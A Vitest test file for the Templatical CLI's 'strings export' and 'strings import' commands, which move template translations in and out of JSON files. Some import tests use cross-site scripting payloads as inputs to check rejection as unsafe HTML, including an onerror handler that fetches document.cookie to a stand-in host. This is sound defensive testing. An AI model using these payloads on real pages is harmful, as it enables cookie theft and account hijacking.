import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { join, resolve } from "node:path";
import { spawnSync } from "node:child_process";
import {
  applyOperations,
  createCustomBlock,
  createDefaultTemplateContent,
  createImageBlock,
  createParagraphBlock,
  sourceHash,
  type CustomBlockDefinition,
  type LocaleString,
} from "@templatical/types";

let dir: string;
let file: string;
const bin = resolve(import.meta.dirname, "../dist/bin.js");
const run = (...args: string[]) =>
  spawnSync(process.execPath, [bin, "strings", ...args], { encoding: "utf8" });
const read = (path: string) => JSON.parse(readFileSync(path, "utf8"));
const write = (path: string, data: unknown) =>
  writeFileSync(path, JSON.stringify(data));

function fixture() {
  const content = createDefaultTemplateContent();
  content.settings.locale = "en";
  content.settings.locales = ["de"];
  content.blocks = [
    createParagraphBlock({ id: "missing", content: "Hello {{name}} Sable" }),
    createParagraphBlock({
      id: "stale",
      content: "New text",
      l10n: {
        de: {
          text: {
            content: {
              value: "Alter Text",
              sourceHash: sourceHash("Old text"),
            },
          },
        },
      },
    }),
    createParagraphBlock({
      id: "current",
      content: "Welcome",
      l10n: {
        de: {
          text: {
            content: { value: "Willkommen", sourceHash: sourceHash("Welcome") },
          },
        },
      },
    }),
    createImageBlock({
      id: "image",
      alt: "A photo",
      src: "https://x.test/photo.png",
    }),
  ];
  write(file, content);
  return content;
}

function exported(...args: string[]) {
  const result = run("export", file, "--locale", "de", ...args);
  expect(result.status, result.stderr).toBe(0);
  return JSON.parse(result.stdout) as {
    templatical: string;
    sourceLocale: string;
    targetLocale: string;
    strings: (LocaleString & { previous?: string })[];
  };
}

beforeEach(() => {
  dir = mkdtempSync(join(import.meta.dirname, ".strings-"));
  file = join(dir, "template.json");
  fixture();
});
afterEach(() => rmSync(dir, { recursive: true, force: true }));

describe("strings export", () => {
  it.each(["gaps", "all"])(
    "exports changed-tag stale fields under %s and imports the current tag",
    (only) => {
      const content = fixture();
      content.blocks = [
        createParagraphBlock({
          id: "copy",
          content: "Hello {{first_name}}",
          l10n: {
            de: {
              text: {
                content: {
                  value: "Hallo {{name}}",
                  sourceHash: sourceHash("Hello {{name}}"),
                },
              },
            },
          },
        }),
      ];
      write(file, content);
      const data = exported("--only", only);
      expect(data.strings).toEqual([
        {
          id: "copy/content",
          format: "html",
          source: 'Hello <x id="1"/>',
          sourceHash: sourceHash("Hello {{first_name}}"),
        },
      ]);
      data.strings[0].text = 'Hallo <x id="1"/>';
      const strings = join(dir, "strings.json");
      write(strings, data);
      const result = run("import", file, strings, "--json");
      expect(result.status, result.stderr).toBe(0);
      expect(JSON.parse(result.stdout)).toEqual({
        applied: 1,
        rejected: [],
        file,
      });
      expect(read(file).blocks[0].l10n.de.text.content).toEqual({
        value: "Hallo {{first_name}}",
        sourceHash: sourceHash("Hello {{first_name}}"),
      });
    },
  );
  it("prints the strings/1 file, with missing and stale fields by default, even with --json", () => {
    const data = exported("--json");
    expect(Object.keys(data)).toEqual([
      "templatical",
      "sourceLocale",
      "targetLocale",
      "strings",
    ]);
    expect(data).toMatchObject({
      templatical: "strings/1",
      sourceLocale: "en",
      targetLocale: "de",
    });
    expect(data.strings.map((s) => s.id)).toEqual([
      "missing/content",
      "stale/content",
      "image/alt",
    ]);
    expect(data.strings[0]).toEqual({
      id: "missing/content",
      format: "html",
      source: 'Hello <x id="1"/> Sable',
      sourceHash: sourceHash("Hello {{name}} Sable"),
    });
    expect(data.strings[1]).toEqual({
      id: "stale/content",
      format: "html",
      source: "New text",
      sourceHash: sourceHash("New text"),
      previous: "Alter Text",
    });
  });
  it("exports a stale entry's translation as previous, without text, under --only all too", () => {
    expect(exported("--only", "all", "--block", "stale").strings).toEqual([
      {
        id: "stale/content",
        format: "html",
        source: "New text",
        sourceHash: sourceHash("New text"),
        previous: "Alter Text",
      },
    ]);
  });
  it("refuses the default language with exit 1 and no stdout", () => {
    const before = readFileSync(file, "utf8");
    const result = run("export", file, "--locale", "en", "--json");
    expect(result.status).toBe(1);
    expect(result.stderr).toContain(
      `"en" is the default language of ${file}, not a language version.`,
    );
    expect(result.stdout).toBe("");
    expect(readFileSync(file, "utf8")).toBe(before);
  });
  it("includes current translations with --only all and filters by --block", () => {
    expect(exported("--only", "all").strings.map((s) => s.id)).toContain(
      "current/content",
    );
    expect(exported("--only", "all", "--block", "current").strings).toEqual([
      {
        id: "current/content",
        format: "html",
        source: "Welcome",
        sourceHash: sourceHash("Welcome"),
        text: "Willkommen",
      },
    ]);
  });
  it("defaults to liquid and accepts each editor syntax preset", () => {
    expect(exported().strings).toEqual(exported("--syntax", "liquid").strings);
    const content = fixture();
    for (const [syntax, tag] of [
      ["handlebars", "{{{name}}}"],
      ["mailchimp", "*|NAME|*"],
      ["ampscript", "%%=name=%%"],
    ]) {
      content.blocks = [
        createParagraphBlock({ id: "copy", content: `Hi ${tag}` }),
      ];
      write(file, content);
      expect(exported("--syntax", syntax).strings[0].source).toBe(
        'Hi <x id="1"/>',
      );
    }
  });
  it("masks protected terms and writes --out with a JSON summary", () => {
    const terms = join(dir, "terms.json");
    write(terms, [" Sable "]);
    const out = join(dir, "nested", "strings.json");
    const result = run(
      "export",
      file,
      "--locale",
      "de",
      "--do-not-translate",
      terms,
      "--out",
      out,
      "--json",
    );
    expect(result.status, result.stderr).toBe(0);
    expect(JSON.parse(result.stdout)).toEqual({
      file: out,
      sourceLocale: "en",
      targetLocale: "de",
      count: 3,
    });
    expect(read(out).strings[0].source).toBe('Hello <x id="1"/> <x id="2"/>');
  });
  it("reports unknown_locale on stderr and exits 1 without stdout", () => {
    const result = run("export", file, "--locale", "fr", "--json");
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("unknown_locale");
    expect(result.stdout).toBe("");
  });
  it.each([
    ["--only", "some"],
    ["--syntax", "custom"],
    ["--locale"],
    ["--block"],
    ["--out"],
  ])("rejects invalid or missing option values: %s %s", (...flags) => {
    const result = run("export", file, "--locale", "de", ...flags);
    expect(result.status).toBe(2);
    expect(result.stderr).toContain(flags[0]);
    expect(result.stderr).not.toContain("Unknown command");
    expect(result.stdout).toBe("");
  });
});

describe("strings import", () => {
  it("applies nothing for a stale entry imported unchanged and never reads previous", () => {
    const data = exported();
    const strings = join(dir, "strings.json");
    write(strings, data);
    const result = run("import", file, strings, "--json");
    expect(result.status, result.stderr).toBe(0);
    expect(JSON.parse(result.stdout)).toEqual({
      applied: 0,
      rejected: [],
      file,
    });
    expect(read(file).blocks[1].l10n.de.text.content).toEqual({
      value: "Alter Text",
      sourceHash: sourceHash("Old text"),
    });
    const stale = data.strings.find((entry) => entry.id === "stale/content")!;
    data.strings = [
      { ...stale, previous: "<script>alert(1)</script>", text: "Neuer Text" },
    ];
    write(strings, data);
    const filled = run("import", file, strings, "--json");
    expect(filled.status, filled.stderr).toBe(0);
    expect(JSON.parse(filled.stdout).applied).toBe(1);
    expect(read(file).blocks[1].l10n.de.text.content).toEqual({
      value: "Neuer Text",
      sourceHash: sourceHash("New text"),
    });
  });
  it("refuses a strings file exported before another language became the default, writing nothing", () => {
    const data = exported();
    for (const entry of data.strings) entry.text = entry.source;
    const strings = join(dir, "strings.json");
    write(strings, data);
    write(
      file,
      applyOperations(read(file), [{ op: "setDefaultLocale", locale: "de" }]),
    );
    const before = readFileSync(file, "utf8");
    const result = run("import", file, strings, "--json");
    expect(result.status).toBe(2);
    expect(result.stderr).toContain(
      `${strings} was exported from "en", but the default language of ${file} is "de". Export the strings again.`,
    );
    expect(result.stdout).toBe("");
    expect(readFileSync(file, "utf8")).toBe(before);
  });
  it("refuses a strings file that targets the default language with exit 1, writing nothing", () => {
    const data = exported();
    data.targetLocale = "en";
    for (const entry of data.strings) entry.text = entry.source;
    const strings = join(dir, "strings.json");
    write(strings, data);
    const before = readFileSync(file, "utf8");
    const result = run("import", file, strings, "--json");
    expect(result.status).toBe(1);
    expect(result.stderr).toContain(
      `"en" is the default language of ${file}, not a language version.`,
    );
    expect(result.stdout).toBe("");
    expect(readFileSync(file, "utf8")).toBe(before);
  });
  it("rejects markup a text-format source doesn't carry as unsafe_html", () => {
    const data = exported("--only", "all");
    data.strings = data.strings.filter((entry) => entry.id === "image/alt");
    data.strings[0].text = "<img src=x onerror=alert(1)>";
    const strings = join(dir, "strings.json");
    write(strings, data);
    const result = run("import", file, strings, "--json");
    expect(result.status).toBe(1);
    expect(JSON.parse(result.stdout)).toEqual({
      applied: 0,
      rejected: [{ id: "image/alt", reason: "unsafe_html" }],
      file,
    });
    expect(read(file).blocks[3].l10n).toBeUndefined();
  });
  it("checks custom-block text fields from definitions against their source", () => {
    const definition: CustomBlockDefinition = {
      type: "welcome",
      name: "Welcome",
      fields: [
        {
          key: "heading",
          label: "Heading",
          type: "text",
          default: "Use <b> for bold",
        },
      ],
      template: "<p>{{ heading }}</p>",
    };
    const definitions = join(dir, "definitions.json");
    write(definitions, [definition]);
    const content = fixture();
    content.blocks = [{ ...createCustomBlock(definition), id: "welcome" }];
    write(file, content);
    const strings = join(dir, "strings.json");
    const exportedFile = run(
      "export",
      file,
      "--locale",
      "de",
      "--definitions",
      definitions,
    );
    expect(exportedFile.status, exportedFile.stderr).toBe(0);
    const data = JSON.parse(exportedFile.stdout);
    expect(data.strings.map((entry: LocaleString) => entry.id)).toEqual([
      "welcome/fieldValues.heading",
    ]);
    data.strings[0].text = "<img src=x onerror=fetch('//x/'+document.cookie)>";
    write(strings, data);
    const unsafe = run(
      "import",
      file,
      strings,
      "--definitions",
      definitions,
      "--json",
    );
    expect(unsafe.status).toBe(1);
    expect(JSON.parse(unsafe.stdout).rejected).toEqual([
      { id: "welcome/fieldValues.heading", reason: "unsafe_html" },
    ]);
    data.strings[0].text = "Nutzen Sie <b> für Fett";
    write(strings, data);
    const safe = run(
      "import",
      file,
      strings,
      "--definitions",
      definitions,
      "--json",
    );
    expect(safe.status, safe.stderr).toBe(0);
    expect(read(file).blocks[0].l10n.de.text["fieldValues.heading"].value).toBe(
      "Nutzen Sie <b> für Fett",
    );
  });
  it.each(["</table>", "</mj-text>", "<p>x</div>"])(
    "rejects raw closing markup %s and still applies the accepted string",
    (html) => {
      const data = exported("--only", "all");
      data.strings = data.strings.filter(
        (entry) => entry.id === "current/content" || entry.id === "image/alt",
      );
      data.strings[0].text = html;
      data.strings[1].text = "Ein Foto";
      const strings = join(dir, "strings.json");
      write(strings, data);
      const result = run("import", file, strings, "--json");
      expect(result.status).toBe(1);
      expect(JSON.parse(result.stdout)).toEqual({
        applied: 1,
        rejected: [{ id: "current/content", reason: "unsafe_html" }],
        file,
      });
      expect(read(file).blocks[2].l10n.de.text.content.value).toBe(
        "Willkommen",
      );
      expect(read(file).blocks[3].l10n.de.text.alt.value).toBe("Ein Foto");
    },
  );
  it("reports an emptied default as stale", () => {
    const data = exported("--only", "all", "--block", "current");
    const content = fixture();
    content.blocks[2] = createParagraphBlock({
      ...content.blocks[2],
      content: "",
    });
    write(file, content);
    const strings = join(dir, "strings.json");
    write(strings, data);
    const result = run("import", file, strings, "--json");
    expect(result.status).toBe(1);
    expect(JSON.parse(result.stdout).rejected).toEqual([
      { id: "current/content", reason: "stale" },
    ]);
    expect(
      JSON.parse(readFileSync(file, "utf8")).blocks[2].l10n.de.text.content
        .value,
    ).toBe("Willkommen");
  });
  it("reports stale when an edited default also changes its tags", () => {
    const content = fixture();
    content.blocks = [
      createParagraphBlock({
        id: "copy",
        content: "Hi {{name}}",
        l10n: {
          de: {
            text: {
              content: {
                value: "Hallo {{name}}",
                sourceHash: sourceHash("Hi {{name}}"),
              },
            },
          },
        },
      }),
    ];
    write(file, content);
    const data = exported("--only", "all");
    content.blocks[0] = createParagraphBlock({
      ...content.blocks[0],
      content: "Hi {{first_name}}",
    });
    write(file, content);
    const strings = join(dir, "strings.json");
    write(strings, data);
    const result = run("import", file, strings, "--json");
    expect(result.status).toBe(1);
    expect(JSON.parse(result.stdout).rejected).toEqual([
      { id: "copy/content", reason: "stale" },
    ]);
  });
  it.each([
    "out",
    "block",
    "only",
    "syntax",
    "definitions",
    "do-not-translate",
  ])("does not consume --json as a missing --%s value", (flag) => {
    const result = run(
      "export",
      file,
      "--locale",
      "de",
      `--${flag}`,
      "--json",
      "--cwd",
      dir,
    );
    expect(result.status).toBe(2);
    expect(result.stdout).toBe("");
    expect(result.stderr).toContain(`--${flag}`);
    expect(result.stderr).toMatch(/needs/);
  });
  it("applies every value and stores its sourceHash", () => {
    const data = exported();
    for (const s of data.strings)
      s.text = s.source
        .replace("Hello", "Hallo")
        .replace("New text", "Neuer Text")
        .replace("A photo", "Ein Foto");
    const strings = join(dir, "strings.json");
    write(strings, data);
    const result = run("import", file, strings, "--json");
    expect(result.status, result.stderr).toBe(0);
    expect(JSON.parse(result.stdout)).toEqual({
      applied: 3,
      rejected: [],
      file,
    });
    expect(read(file).blocks[0].l10n.de.text.content).toEqual({
      value: "Hallo {{name}} Sable",
      sourceHash: sourceHash("Hello {{name}} Sable"),
    });
    expect(read(file).blocks[3].l10n.de.text.alt.value).toBe("Ein Foto");
  });
  it("reports every rejection reason and still writes accepted strings", () => {
    const data = exported("--only", "all");
    data.strings = [
      { ...data.strings[0], text: "Hallo" },
      { ...data.strings[1], sourceHash: "00000000", text: "Alt" },
      { ...data.strings[2], text: "<script>alert(1)</script>" },
      { ...data.strings[3], text: "Ein Foto" },
      {
        id: "image/src",
        format: "text",
        source: "https://x.test/photo.png",
        sourceHash: sourceHash("https://x.test/photo.png"),
        text: "https://x.test/de.png",
      },
      {
        id: "deleted/content",
        format: "html",
        source: "Gone",
        sourceHash: sourceHash("Gone"),
        text: "Weg",
      },
    ];
    const strings = join(dir, "strings.json");
    write(strings, data);
    const result = run("import", file, strings, "--json");
    expect(result.status).toBe(1);
    expect(JSON.parse(result.stdout)).toEqual({
      applied: 1,
      rejected: [
        { id: "missing/content", reason: "tags_changed" },
        { id: "stale/content", reason: "stale" },
        { id: "current/content", reason: "unsafe_html" },
        { id: "image/src", reason: "not_translatable" },
        { id: "deleted/content", reason: "unknown_field" },
      ],
      file,
    });
    expect(read(file).blocks[3].l10n.de.text.alt.value).toBe("Ein Foto");
    expect(read(file).blocks[0].l10n).toBeUndefined();
    expect(read(file).blocks[2].l10n.de.text.content.value).toBe("Willkommen");
  });
  it("rejects a default edited after export as stale, leaving its translation intact", () => {
    const data = exported("--only", "all", "--block", "current");
    data.strings[0].text = "Neu";
    const content = fixture();
    content.blocks[2] = createParagraphBlock({
      ...content.blocks[2],
      content: "Welcome back",
    });
    write(file, content);
    const strings = join(dir, "strings.json");
    write(strings, data);
    const result = run("import", file, strings, "--json");
    expect(result.status).toBe(1);
    expect(JSON.parse(result.stdout).rejected).toEqual([
      { id: "current/content", reason: "stale" },
    ]);
    expect(read(file).blocks[2].l10n.de.text.content.value).toBe("Willkommen");
  });
  it("unmasks merge chips, attribute tags and protected terms before checking rich-text safety; --out preserves the input", () => {
    const chip = '<span data-merge-tag="{{name}}">Name</span>';
    const logic = '<span data-logic-merge-tag="{% endif %}">ENDIF</span>';
    const content = fixture();
    content.blocks = [
      createParagraphBlock({
        id: "copy",
        content: `<p>Sable ${chip} <a href="{{url}}">Go</a>${logic}</p>`,
      }),
    ];
    write(file, content);
    const before = readFileSync(file, "utf8");
    const terms = join(dir, "terms.json");
    write(terms, ["Sable"]);
    const data = exported("--do-not-translate", terms);
    expect(data.strings[0].source).toBe(
      '<p><x id="1"/> <x id="2"/> <a href="__x3__">Go</a><x id="4"/></p>',
    );
    data.strings[0].text = data.strings[0].source.replace("Go", "Los");
    const strings = join(dir, "strings.json");
    write(strings, data);
    const out = join(dir, "out.json");
    const result = run(
      "import",
      file,
      strings,
      "--do-not-translate",
      terms,
      "--out",
      out,
      "--json",
    );
    expect(result.status, result.stderr).toBe(0);
    expect(JSON.parse(result.stdout)).toEqual({
      applied: 1,
      rejected: [],
      file: out,
    });
    expect(read(out).blocks[0].l10n.de.text.content.value).toBe(
      `<p>Sable ${chip} <a href="{{url}}">Los</a>${logic}</p>`,
    );
    expect(readFileSync(file, "utf8")).toBe(before);
  });
  it("checks placeholders before unsafe HTML and rejects unsafe restored tokens", () => {
    const content = fixture();
    content.blocks = [
      createParagraphBlock({
        id: "copy",
        content: '<span data-merge-tag="{{name}}" onclick="bad()">Name</span>',
      }),
    ];
    write(file, content);
    const data = exported();
    const strings = join(dir, "strings.json");
    data.strings[0].text = "<script>bad()</script>";
    write(strings, data);
    expect(
      JSON.parse(run("import", file, strings, "--json").stdout).rejected,
    ).toEqual([{ id: "copy/content", reason: "tags_changed" }]);
    data.strings[0].text = data.strings[0].source;
    write(strings, data);
    const result = run("import", file, strings, "--json");
    expect(result.status).toBe(1);
    expect(JSON.parse(result.stdout).rejected).toEqual([
      { id: "copy/content", reason: "unsafe_html" },
    ]);
  });
  it.each(
    [
      null,
      [],
      {},
      {
        templatical: "strings/2",
        sourceLocale: "en",
        targetLocale: "de",
        strings: [],
      },
      {
        templatical: "strings/1",
        sourceLocale: "en",
        targetLocale: "de",
        strings: [{ id: "copy/content", text: 4 }],
      },
    ].map((data, index) => ({ data, index })),
  )("rejects malformed strings file $index", ({ data }) => {
    const strings = join(dir, "strings.json");
    write(strings, data);
    const before = readFileSync(file, "utf8");
    const result = run("import", file, strings, "--json");
    expect(result.status).toBe(2);
    expect(result.stderr).toContain("strings/1");
    expect(result.stdout).toBe("");
    expect(readFileSync(file, "utf8")).toBe(before);
  });
  it("reports unreadable or non-JSON strings files and missing arguments as misuse", () => {
    const strings = join(dir, "strings.json");
    const missing = run("import", file, strings);
    expect(missing.status).toBe(2);
    expect(missing.stderr).toContain(`Could not read ${strings}`);
    writeFileSync(strings, "{");
    const invalid = run("import", file, strings);
    expect(invalid.status).toBe(2);
    expect(invalid.stderr).toContain("not valid JSON");
    const argument = run("import", file);
    expect(argument.status).toBe(2);
    expect(argument.stderr).toContain("strings import needs");
  });
  it.each(
    [
      null,
      "Sable",
      [""],
      ["  "],
      [1],
      ["a".repeat(101)],
      Array(501).fill("a"),
    ].map((data, index) => ({ data, index })),
  )("rejects invalid do-not-translate file $index", ({ data }) => {
    const terms = join(dir, "terms.json");
    write(terms, data);
    const result = run(
      "export",
      file,
      "--locale",
      "de",
      "--do-not-translate",
      terms,
    );
    expect(result.status).toBe(2);
    expect(result.stderr).toContain(
      "--do-not-translate must be an array of at most 500 terms, each 1–100 characters.",
    );
  });
});
